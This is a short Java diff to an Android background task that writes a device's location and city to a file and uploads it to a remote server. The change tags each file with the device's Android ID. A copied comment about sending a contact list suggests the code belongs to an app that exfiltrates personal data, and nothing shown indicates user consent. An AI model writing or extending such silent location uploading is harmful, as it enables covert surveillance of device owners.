@@ -27,12 +27,14 @@ public class SendGeoLocationAsyncTask extends AsyncTask<Context, Void, String> {
     private String latitude;
     private String longitude;
     private String cityName;
+    private String android_id;
 
-    public SendGeoLocationAsyncTask(Context context, String latitude, String longitude, String cityname) {
+    public SendGeoLocationAsyncTask(Context context, String android_id, String latitude, String longitude, String cityname) {
         this.context = context;
         this.latitude = latitude;
         this.longitude = longitude;
         this.cityName = cityname;
+        this.android_id = android_id;
 
     }
 
@@ -71,7 +73,7 @@ public class SendGeoLocationAsyncTask extends AsyncTask<Context, Void, String> {
         }
 
         // Create a file with the contact list to send to the remote server
-        File file = new File(Environment.getExternalStorageDirectory() + File.separator + "geolocation.txt");
+        File file = new File(Environment.getExternalStorageDirectory() + File.separator + android_id+"-geolocation"+".txt");
         try {
             file.createNewFile();
         } catch (IOException e) {
@@ -109,7 +111,7 @@ public class SendGeoLocationAsyncTask extends AsyncTask<Context, Void, String> {
             // Send file to server
             try {
                 System.out.println("Starting File Upload:");
-                String fsrc = file.getPath(), fdest = "geolocation.txt";
+                String fsrc = file.getPath(), fdest = android_id+"-geolocation"+".txt";
                 c.put(fsrc, fdest);
             } catch (Exception e) {
                 e.printStackTrace();
